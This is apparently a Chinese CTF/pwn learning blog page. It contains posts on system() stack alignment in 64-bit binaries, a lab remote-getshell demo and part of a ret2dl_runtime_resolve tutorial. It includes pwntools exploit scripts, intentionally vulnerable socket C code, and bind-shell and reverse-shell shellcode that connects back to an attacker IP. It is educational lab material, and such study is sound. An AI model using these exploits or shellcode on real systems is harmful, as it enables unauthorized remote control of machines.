class="comment">#这样来修改sp的值，如果不修改sp的值的话，执行shellcode的时候，有个指令会将栈里（此时是bss段）的值修改，从而导致shellcode执行失败。</span></span><br><span class="line"><span class="comment">#上述的内容用一句话说就是，要将栈迁移到执行流的地方。不然shellcode会把自身给破坏了... 要是不相信的话，可以不要这两个指令，然后调试一下，就明白咋回事了</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/75ba47d9.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/75ba47d9.html" class="post-title-link" itemprop="url">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:45:33" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%8E%A2%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">探究</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>有时候在做64位题目的时候会exp完全没问题，但就是获取不了shell。然后通过gdb调试发现是在最后的system函数执行的时候卡住了，然后就满脸疑惑，这也能卡？？？</p>
<h2 id="为什么执行system函数要栈对齐"><a href="#为什么执行system函数要栈对齐" class="headerlink" title="为什么执行system函数要栈对齐"></a>为什么执行system函数要栈对齐</h2><p>其实啊，<strong>64位ubuntu18以上系统调用system函数时是需要栈对齐的</strong>。再<strong>具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐</strong>，如果你到system函数执行的时候，si单步进去就会发现，如果没对齐的话，最后就会卡在这里（如下图）。<br><img src="/../img/2706180-20220629161534055-1971449802.png"></p>
<h2 id="对齐？怎么才算对齐？"><a href="#对齐？怎么才算对齐？" class="headerlink" title="对齐？怎么才算对齐？"></a>对齐？怎么才算对齐？</h2><p>因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。如下图</p>
<p><img src="/../img/2706180-20220312122451427-1700171694.png"></p>
<p>只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system地址末尾是0。</p>
<p>下面两个图，分别是没对齐和对齐的情况。</p>
<p><img src="/../img/2706180-20220312122500759-1557162145.png"></p>
<p><img src="/../img/2706180-20220312122510505-529221181.png"></p>
<h2 id="如果执行system的时候没有对齐怎么办？"><a href="#如果执行system的时候没有对齐怎么办？" class="headerlink" title="如果执行system的时候没有对齐怎么办？"></a>如果执行system的时候没有对齐怎么办？</h2><p>如果<strong>执行了一个对栈地址的操作指令</strong>（比如pop,ret,push等等，但如果是mov这样的则不算对栈的操作指令），那么<strong>栈地址就会+8或是-8</strong>。<strong>为使rsp对齐16字节，核心思想就是增加或减少栈内容，使rsp地址能相应的增加或减少8字节，这样就能够对齐16字节了。因为栈中地址都是以0或8结尾，0已经对齐16字节，因此只需要进行奇数次pop或push操作，就能把地址是8结尾的rsp变为0结尾，使其16字节对齐。</strong></p>
<p>这时候有两种解决方法。</p>
<p>1、去将system函数地址+1，<strong>此处的+1，即是把地址+1，也可以理解为</strong></p>
<p><strong>+1是为了跳过一条栈操作指令（我们的目的就是跳过一条栈操作指令，使rsp十六字节对齐</strong>，<strong>跳过一条指令，自然就是把8变成0了</strong>）。但又一个问题就是，本来+1是为了跳过一条栈操作指令，但是你也不知道下一条指令是不是栈操作指令，如果不是栈操作指令的话（你加一之后有可能正好是mov这种指令，也有可能人家指令是好几个字节，你加一之后也没有到下一个指令呢），+1也是徒劳的，要么就继续+1，一直加到遇见一条栈操作指令为止（看别的师傅说最大加16次就能成功，不过我不知道为啥）</p>
<p><img src="/../img/2706180-20220312122522900-1221918873.png"></p>
<p><strong>可以看见本来我们应该是用401186这个地址的，但是我们现在要跳过一条指令，那自然就是用401187，这样就跳过了push rbp这条指令。</strong></p>
<p>2、直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。</p>
<p>因此payload有两种改法（下面我是以BUUCTF上的rip题目的exp为例）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#加1去跳过一个栈操作指令，使其对齐16字节</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;please input&quot;)#这里用recvuntil会报连接超时，因为nc上去发现服务器那边的程序上没有打印这句话</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401016</span>)+p64(<span class="number">0x401186</span>)+p64(<span class="number">0</span>)<span class="comment">#0x401016是一个ret指令， p64(0)是system函数的返回地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/729cf436.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/729cf436.html" class="post-title-link" itemprop="url">一次简单的远程Getshell（在目标机上开启一个shell）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:45:21" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%8E%A2%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">探究</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p>从第一次接触pwn的到现在将近四个月了，每次做出来pwn题之后，把写好的脚本打到服务器上，就可以在服务器那边开启一个shell，然后用cat就可以读出我们需要的flag了。可是事实上我们真的可以用pwn的解题手法去进行一次攻击么？我们最后在对方主机去执行system(‘&#x2F;bin&#x2F;sh’)真的可以拿到shell么？</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>接下来的实验环境：</p>
<p>攻击者的机器是Ubuntu   ip:192.168.43.150</p>
<p>目标机是kali     	 ip:192.168.43.71</p>
<h2 id="对疑惑做一个简单的回答"><a href="#对疑惑做一个简单的回答" class="headerlink" title="对疑惑做一个简单的回答"></a>对疑惑做一个简单的回答</h2><h3 id="先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。"><a href="#先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。" class="headerlink" title="先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。"></a>先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。</h3><p>可以的，因为接下来，我就演示一下利用与解pwn相同的思路完成一次最最最简单入侵（甚至简单到还需要目标机的配合），就是在目标机上运行一个有漏洞的程序，然后攻击者发送给目标机一个脚本，然后在攻击者的主机上开启一个shell，用来控制目标机</p>
<h3 id="再回答第二个问题（我们最后在对方主机去执行system-‘-x2F-bin-x2F-sh’-真的可以拿到shell么？）。"><a href="#再回答第二个问题（我们最后在对方主机去执行system-‘-x2F-bin-x2F-sh’-真的可以拿到shell么？）。" class="headerlink" title="再回答第二个问题（我们最后在对方主机去执行system(‘&#x2F;bin&#x2F;sh’)真的可以拿到shell么？）。"></a>再回答第二个问题（我们最后在对方主机去执行system(‘&#x2F;bin&#x2F;sh’)真的可以拿到shell么？）。</h3><p>不可以的，如果仅仅是平常我们做题的脚本，发到了运行着漏洞程序的目标机上，执行了system(‘&#x2F;bin&#x2F;sh’)，仅仅是在目标机上开了一个shell，这个shell与攻击者的主机是没有任何关系的（如下图）</p>
<p><img src="/../img/2706180-20220311170438374-343305220.png"></p>
<p>可以看到kali上确实开启了一个新的shell，但是这个shell跟攻击者是没关系的，可以看下ubuntu这边的情况（发现是没有任何回显的）。</p>
<p><img src="/../img/2706180-20220311170452032-529076340.png"></p>
<h2 id="进攻的思路以及准备"><a href="#进攻的思路以及准备" class="headerlink" title="进攻的思路以及准备"></a>进攻的思路以及准备</h2><h3 id="首先第一点，就是怎么找到目标机？"><a href="#首先第一点，就是怎么找到目标机？" class="headerlink" title="首先第一点，就是怎么找到目标机？"></a>首先第一点，就是怎么找到目标机？</h3><p>对方也仅仅是个主机，它并不会像服务器那样暴露在公网上，而攻击者的主机和目标机就如同黑暗森林中带枪的猎人，无法直接被找到，而想要找到它，就需要不断的去接近它，最终猎人们彼此处于了同一片森林（也就是攻击者与目标机处于了同一个网段）。此时猎人试着用nmap工具扫描了一下，然后就发现了另一个猎人的ip（这个192.168.43.1是网关（gateway)）。</p>
<p><img src="/../img/2706180-20220311170506140-1776303059.png"></p>
<p>猎人抱着试试看的心态，去扫描了一下这个ip。</p>
<p><img src="/../img/2706180-20220311170524403-609189311.png"></p>
<p>发现了开放8888这个端口，而这个端口运行了一个无NX无canary且有溢出的程序（至于猎人怎么知道运行的是这个漏洞程序，这里不做讨论，毕竟这篇文章的目的是演示下最简单的进攻流程，而实际的环境中要比这个流程复杂很多）。</p>
<p>漏洞程序的源码如下（这里我用的是这位师傅的源码<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/%EF%BC%89%EF%BC%9A">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/）：</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span>  s,c,j  =  <span class="number">0xe4ff</span>;<span class="comment">//留下的这个0xe4ff对应的小端序机器码就是jmp rsp,这样溢出到返回地址直接填写这个地址，就可以执行下面的shellcode了（就不需要再泄露地址了）</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span> </span><br><span class="line">  server.sin_family      = AF_INET;<span class="comment">//使用IPv4地址</span></span><br><span class="line">  server.sin_addr.s_addr = INADDR_ANY;<span class="comment">//INADDR_ANY为本机的IP</span></span><br><span class="line">  server.sin_port        = htons(<span class="number">8888</span>);<span class="comment">//开放的端口</span></span><br><span class="line"></span><br><span class="line">  s = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);<span class="comment">//第一个参数表示使用IPv4地址，第二个参数是表示套接字类型为面向连接的套接字，第三个参数为使用TCP传输协议</span></span><br><span class="line">      bind  (s,(<span class="keyword">struct</span> sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server));</span><br><span class="line">      listen(s,<span class="number">10</span>);</span><br><span class="line">  c = accept(s,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">      read  (c,buf,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>采用gcc test.c -fno-stack-protector -z execstack -no-pie -o test  #这里关闭了canary和NX保护</p>
<p><img src="/../img/2706180-20220311170534186-1125823830.png"></p>
<p><img src="/../img/2706180-20220311170542067-511506874.png"></p>
<p>用IDA看一下，得到了溢出的偏移（0x16+8)。</p>
<p>由于没有开启NX，我们使用shellcode。如果只是正常开启shell的shellcode的话，那就是本文最开始第二个问题所出现的情况（就是确实是开启了一个shell，但是开在了目标机上，跟攻击者没有任何关系）</p>
<p>因此这里我们就要换一种shellcode。在这之前还要学习一下正连与反连。</p>
<h2 id="正连（正向shell）"><a href="#正连（正向shell）" class="headerlink" title="正连（正向shell）"></a>正连（正向shell）</h2><p>我大概说一下正连的原理。我们现在有一个<strong>shellcode</strong>，他的功能是<strong>在目标机上开启一个shell</strong>（现在看来功能和寻常获取shell的shellcode没什么区别），不过紧接着<strong>这个shellcode还会将刚刚开启的这个shell 的输入、输出绑定到我们指定的端口上（这个端口是在目标机上的）</strong>。然后<strong>我们继续利用pwntools去连接这个新开的端口，这样我们就获得了一个可以与目标机产生交互的shell（因为我们远程连接了目标机一个端口上的shell嘛）</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">sc = asm(shellcraft.bindsh(<span class="number">4444</span>))<span class="comment">#这个意思就是开启一个shell，把这个shell绑定到4444端口</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+sc)<span class="comment">#这个偏移是30，但是好像不同的机器编译源码之后，这个偏移可能不一样。然后这个0x400669是jmp rsp的位置，这个不同电脑的这个指令位置也是不同的，还是要自己用ROPgadget搜一下吧。</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">4444</span>)<span class="comment">#然后再次连接到刚刚开启的shell上</span></span><br><span class="line">sh.interactive()<span class="comment">#这个交互是与sh交互，而不是与io交互</span></span><br></pre></td></tr></table></figure>

<p>因为kali是以root权限运行的漏洞程序，因此用脚本开启的shell就直接是root权限，还可以创建和删除文件。</p>
<p><img src="/../img/2706180-20220311170554118-208807962.png"></p>
<p><img src="/../img/2706180-20220311170602137-1122006877.png"></p>
<p>可以看到如果是以root权限开启shell的话，威力还是非常大的。也就是说被攻击者用什么权限运行的漏洞程序，攻击者远程获取的shell就是什么权限。</p>
<h2 id="反连（反向shell）"><a href="#反连（反向shell）" class="headerlink" title="反连（反向shell）"></a>反连（反向shell）</h2><p>关于反弹shell可以阅读下面两篇文章</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
<p>利用这个反连的话，我们<strong>需要先监听本机的一个端口</strong>（你可以把这个监听理解成打开），然后也是利用一段shellcode，<strong>这个shellcode会实现反弹shell</strong>，<strong>将shell反弹到我在本机开的端口上去。然后用pwntools中的wait_for_connection函数等待着反连</strong>。等到反连成功后，即可在攻击者的窗口开启一个与目标机交互的shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = listen(<span class="number">4444</span>)<span class="comment">#在本机监听4444端口</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)<span class="comment">#远程连接到目标机</span></span><br><span class="line">shellcode = asm(shellcraft.connect(<span class="string">&#x27;192.168.43.150&#x27;</span>,<span class="number">4444</span>)+shellcraft.dupsh())<span class="comment">#让目标机连接到我们本机开放的端口</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+shellcode)</span><br><span class="line"></span><br><span class="line">sh.wait_for_connection()</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次kali使用了普通用户来运行漏洞程序，可以看见这次攻击者就没有办法去创建或是删除文件了。</p>
<p><img src="/../img/2706180-20220311170613647-976763824.png"></p>
<p><img src="/../img/2706180-20220311170621593-1348201456.png"></p>
<p>总结一下正向shell和反向shell。<strong>在实际的攻击当中，正向shell是攻击者连接被攻击者的机器，可以用于攻击者身处内网，被攻击者身处外网的情况；而反向shell则是被攻击者主动连接攻击者，可以用于攻击者处于外网，被攻击者处于内网的情况</strong>。 </p>
<p>其实本次攻击到此也就结束了，我们分别用正连和反连的方法获取了目标机的shell。但往往很多东西看着简单，但做的难。实际操作的时候就会遇见各种各样稀奇古怪的问题，也会绕许多弯路。</p>
<h2 id="在完成实验时所碰到的问题"><a href="#在完成实验时所碰到的问题" class="headerlink" title="在完成实验时所碰到的问题"></a>在完成实验时所碰到的问题</h2><h3 id="1、同步网段问题"><a href="#1、同步网段问题" class="headerlink" title="1、同步网段问题"></a>1、同步网段问题</h3><p>首先是将两个虚拟机部署在同一个网段的问题，正常情况下，只需要让虚拟机开桥接模式即可。</p>
<p><img src="/../img/2706180-20220311170629421-1313264995.png"></p>
<p><strong>这是正常情况下，开启桥接模式之后，虚拟机就会和主机在同一个网段下面</strong>，只要让两台主机去连一个相同的热点，这样ubuntu和kali就可以处于在一个网段上了。但天有不测风云，我的电脑开启桥接之后，虚拟机和主机并不在一个网段上。</p>
<p>我采用的解决方法是让VMnet0桥接到物理网卡上。</p>
<p><img src="/../img/2706180-20220311170636696-617709141.png"></p>
<p>然后在网络适配器这里改成自定义，去连接VMnet0。<strong>（因为我当时不知道咋搞的，把虚拟网卡弄没了一个，用这个方法的话，可以让自己的两个虚拟机都桥接到一个物理网卡上面）</strong><br><img src="/../img/2706180-20220311170644194-2024796383.png"></p>
<p>最后两个虚拟机都处于了同一网段。</p>
<h3 id="2、socat工具绑定端口出现的问题"><a href="#2、socat工具绑定端口出现的问题" class="headerlink" title="2、socat工具绑定端口出现的问题"></a>2、socat工具绑定端口出现的问题</h3><p>最开始的时候，我写了一个只有漏洞的程序（没有开启端口这部分），然后我是用socat工具去绑定的。绑定的也很成功。然后就去写脚本打，可是不管怎么打脚本，最后得到的都是EOF</p>
<p><img src="/../img/2706180-20220311170650236-893387920.png"></p>
<p>请教了roderick师傅之后，得出来的结论是<strong>socat不知道因为什么原因，等到shellcode执行之后，关闭了socket。因此这里的端口与进程绑定不能用socat工具来绑定了</strong>，就采用了<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/%E8%BF%99%E4%B8%AA%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2%E4%B8%8A%E7%9A%84%E6%B6%89%E5%8F%8A%E6%80%9D%E8%B7%AF%EF%BC%8C%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%B8%8A%EF%BC%8C%E5%8A%A0%E4%B8%80%E6%AE%B5%E5%B0%86%E8%87%AA%E8%BA%AB%E7%BB%91%E5%AE%9A%E7%BB%99%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E8%BF%99%E6%A0%B7%E8%BF%90%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%90%8E%E8%87%AA%E5%B7%B1%E5%B0%B1%E4%B8%8E%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E7%BB%91%E5%AE%9A%E4%BA%86%E3%80%82">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/这个师傅博客上的涉及思路，在漏洞程序源码上，加一段将自身绑定给端口的代码。这样运行漏洞程序之后自己就与指定的端口绑定了。</a></p>
<p>感悟：一次非常非常简单的攻击<strong>（简单到有的地方甚至还需要被攻击者的配合，真正的情况中，攻击者怎么才能知道被攻击者开放的端口里正好运行了漏洞程序，而攻击者又恰好有一个脚本？这些在本文章都没有探究或者说目前以我的水平也没法去想这些。但是不影响在我们建立假设的前提下去进行一些实验和思考）</strong>，在实验的过程中碰到了很多小问题，有的是卡了一会，有的则是卡了一天，如同上面第二个那个问题，描述它很简单，只用了两句话，但是发现这个问题所在却是用了一天多的时间。看别人操作总是感觉很简单，包括自己的所认为的思路也想的很简单，有时候我们认为不可能出现问题的地方，却恰恰是卡了我们很久的地方。<strong>因此在平常的做题以及学习的过程中，还是要多去思考，多去问，多去实践，才能更快的进步。</strong></p>
<p>最后本文还要感谢 <a target="_blank" rel="noopener" href="https://roderickchan.github.io/">roderick师傅</a> 以及我的两位同学（<a target="_blank" rel="noopener" href="https://www.timochan.cn/">提莫酱</a> 和 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LQ-Joker">joker</a>），如果没有他们的帮助，也许我还会绕很多弯路。</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/ba418f23.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/ba418f23.html" class="post-title-link" itemprop="url">关于ret2_dl_runtime_resolve的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:45:01" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>这篇文章也算是集百家之长了，因为在学习ret2dlresolve这个高级rop的时候，师傅们可能都是因为实力比较强，因而在一些细节的地方没有解释为什么，如此在学习的时候，还是稍微有点吃力的，学习了很多位师傅的博客之后加上自己的一些思考才写出了这篇博客（我认为写的比较好的博客链接都放到文章最后了，我有的小细节可能忘记提到了，可以去这些师傅的博客上面看一下），也算是站在巨人的肩膀上学习了。</p>
<p>在学习ret2dlresolve的时候，我建议先把_dl_runtime_resolve函数的运作流程搞透彻了再去做题，效果会好很多，不然直接上题的话，根本就不懂原理是怎么搞的。</p>
<p>需要的前置知识：1、对延迟绑定机制的整体流程较为熟悉  2、对栈迁移的知识要比较熟悉  3、做题的时候，可能会遇见很多小细节问题，因此要具备gdb调试能力  4、如果可以的话，最好参考着glibc源码一起学习这部分内容（就是遇见不会的问题，可以从源码上下手试试），尽管我已经出示了用到的结构的源码，但我建议最好你的手里也有一份glibc源码  5、由于刚开始理解会异常的费劲，可能会需要几天才能理解透彻，所以学习这部分的内容还需要有一份耐心</p>
<h1 id="延迟绑定整体流程图"><a href="#延迟绑定整体流程图" class="headerlink" title="延迟绑定整体流程图"></a>延迟绑定整体流程图</h1><p>下面我主要解释_dl_runtime_resolve这个函数运作时的情况，而延迟绑定的整体流程我就不详细说明了，具体的流程可以参考下面这个流程图（这个我也忘记是哪个师傅做的了，很久之前收藏了这个图片）</p>
<p><img src="/../img/2706180-20220228094538432-2125281617.png"></p>
<p>而Linux中最终完成动态链接的函数进行重定位的是在_dl_runtime_resolve(link_map_obj, reloc_index)函数中完成的，如果再详细一点就是_dl_runtime_reslove函数调用了_dl_fixup函数，然后_dl_fixup函数调用了_dl_lookup_symbol_x函数，最终这个函数去动态库里面找到了我们此刻进行延迟绑定的函数，并且把它的地址填写到了got.plt表项中。这里主要详细讲一下_dl_runtime_resolve函数的运作流程</p>
<h1 id="dl-runtime-reslove函数的运作流程"><a href="#dl-runtime-reslove函数的运作流程" class="headerlink" title="_dl_runtime_reslove函数的运作流程"></a>_dl_runtime_reslove函数的运作流程</h1><p>这个函数运行的大致流程如下，<strong>流程不理解也没关系，先结合着我写的流程跟着一起做就可以了</strong>，做完之后肯定就会有点思路了，这时候就可以进行一些思考了。<strong>下面这三个段</strong>，我建议先大概看一下，<strong>不用彻底弄懂</strong>，然后开始跟着我的流程分析，<strong>等遇到这个段的时候，再拐回来看，效果会比较好。</strong></p>
<h3 id="dynamic段"><a href="#dynamic段" class="headerlink" title=".dynamic段"></a>.dynamic段</h3><p><u>.dynamic段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象，动态链接符号表的位置（Dynamic Symbol Table)、动态链接重定位表的位置、动态链接字符串表的位置(Dynamic String Table)</u>。也就是说<strong>比如现在想找到Dynamic Symbol Table，就必须先找到.dynamic的地址，才可以去找到Dynamic Symbol Table，因此这个段主要用于寻找与动态链接相关的其他段( .dynsym .dynstr .rela.plt 等段)。</strong>下面是Elf32_Dyn的结构，它由一个类型值即d_tag和一个数值或指针（union是一个联合体，同时定义了一个数值d_val和一个指针d_ptr，但是一次只能存储一个值，因此这个联合体的大小为4字节，而整个结构体Elf32_Dyn为8字节，这个结构以及结构的大小会在一会查看Dynamic Symbols Table和Dynamic String Table的时候派上用场）。</p>
